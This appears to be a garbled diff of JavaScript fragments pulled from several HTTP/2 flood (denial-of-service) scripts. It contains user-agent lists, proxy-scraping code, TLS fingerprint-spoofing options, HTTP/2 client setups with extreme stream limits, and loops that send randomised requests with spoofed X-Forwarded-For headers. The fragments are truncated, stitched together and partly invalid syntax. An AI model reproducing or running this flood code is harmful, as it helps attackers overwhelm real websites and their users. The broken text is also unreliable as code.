@@ -1,0 +1,367 @@
+_tmp_3.push("Mozilla/5.0 (Linux; Android 5.1; 5019D Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 118.0.0.28.122 Android (22/5.1; 240dpi; 480x854; TCL; 5019D; PIXI3_45_4G; mt6735; ru_RU; 181496409)")
+_tmp_3.push("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150842")
+_tmp_3.push("Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]")
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: settings,
+             maxSessionMemory: 655000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn
+             //socket: connection,
+         })
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+function fetchProxies = async function fetchProxies() {
+  for (const site of raw_proxy_sites) {
+    try {
+      const response = await fetch(site);
+      if (response.ok) {
+//console.log(`success: ${site}`);
+        const data = await response.text();
+        const lines = data.split('\n');
+        for (const line of lines) {
+          if (line.includes(':')) {
+            const [ip, port] = line.split(':', 2);
+            proxies.push(`${ip}:${port}`);
+          }
+        }
+      } else {
+//console.log(`skip: ${site}`);
+      }
+    } catch (error) {
+//console.error(`skip: ${site}`);
+    }
+  }
+
+  fs.writeFileSync(output_file, proxies.join('\n'));
+  fs.readFile(output_file, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Gagal membaca file:', err);
+      return;
+    }
+    const proxies = data.trim().split('\n');
+    const totalProxies = proxies.length;
+    console.log(`success scraping ${totalProxies} proxy`);
+  });
+}
+_tmp_3.push("Mozilla/5.0 (Linux; Android 6.0.1; SM-A510F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 Instagram 45.0.0.17.93 Android (23/6.0.1; 480dpi; 1920x1080; samsung; SM-A510F; a5xelte; samsungexynos7580; pt_PT; 108357722)")
+(_tmp_10 = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PAD...).once
+(_tmp_11 = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure: true,
+                minVe...).on
+_tmp_3.push("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36")
+(_tmp_10 = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypt...).once
+(_tmp_11 = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure...).on
+_tmp_63.push("Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4")
+const restartScript = () => {
+        for (const id in cluster.workers) {
+            cluster.workers[id].kill();
+        }
+
+        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
+        setTimeout(() => {
+            for (let counter = 1; counter <= args.threads; counter++) {
+                cluster.fork();
+            }
+        }, RESTART_DELAY);
+    }
+Socker.HTTP(proxyOptions, (connection, error) => {
+    if (error) return
+
+    connection.setKeepAlive(true, 600000);
+    connection.setNoDelay(true)
+
+    const settings = {
+       enablePush: false,
+       initialWindowSize: 15564991,
+   };
+
+
+
+    const tlsOptions = {
+       port: parsedPort,
+       secure: true,
+       ALPNProtocols: ["h2"],
+       ciphers: cipper,
+       sigalgs: sigalgs,
+       requestCert: true,
+       socket: connection,
+       ecdhCurve: ecdhCurve,
+       honorCipherOrder: false,
+       rejectUnauthorized: false,
+       secureOptions: secureOptions,
+       secureContext :secureContext,
+       host : parsedTarget.host,
+       servername: parsedTarget.host,
+       secureProtocol: secureProtocol
+   };
+    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
+
+    tlsConn.allowHalfOpen = true;
+    tlsConn.setNoDelay(true);
+    tlsConn.setKeepAlive(true, 600000);
+    tlsConn.setMaxListeners(0);
+
+    const client = http2.connect(parsedTarget.href, ...
+_tmp_45.push("Mozilla/5.0 (Linux; Android 7.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36")
+_tmp_45.push("Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36")
+_tmp_45.push("Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36")
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               })
+const client = http2.connect(parsedTarget.href, {
+      settings: {
+     headerTableSize: 65536,
+     initialWindowSize: 6291456,
+     maxFrameSize: 16384,
+   },
+      createConnection: () => tlsConn,
+      socket: connection,
+  })
+_tmp_45.push("Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36")
+_tmp_21.push("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
+const client = await http2.connect(parsedTarget.href, {
+             protocol: "https",
+             settings: {
+            headerTableSize: 8192,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 16384,
+            maxFrameSize: 32768,
+            enablePush: false,
+          },
+             maxSessionMemory: 3333,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_63.push("Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.14) Gecko/20080616 Fedora/2.20.3-4.fc8 Epiphany/2.20 Firefox/2.0.0.14")
+_tmp_21.push("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4327.65535; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727); UnAuth-State")
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_3.push("Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)")
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrs...
+tls.connect({
+                                host: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
+                                    headerbuilders["X-Forwarded-For...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
+                         ...
+tls.connect({
+                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
+                                    headerbuilders["X-Forwarded-For"] = spoof();
+                                  ...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                              	host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: true,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:...
+tls.connect({
+                              	host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: true,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
+									h...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+								host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: false,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}` + randstr2(10) + '+' + randstr2(10);
+									headerbuilders["...
+tls.connect({
+								host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: false,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}` + randstr2(10) + '+' + randstr2(10);
+									headerbuilders["X-Forwarded-For"] = proxy[0];
+                                    const req = client.reque...
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                headerTableSize: 65536,
+                maxConcurrentStreams: 10000,
+                initialWindowSize: 65535,
+                maxHeaderListSize: 65536,
+                enablePush: false
+            },
+            maxSessionMemory: 64000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        })
+connection.on("connect", () => {
+         connection.write(buffer);
+     })
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxConcurrentStreams: 100,
+            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            enablePush: false
+          },
+             maxSessionMemory: 3333,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_5.createConnection = <lambda>4
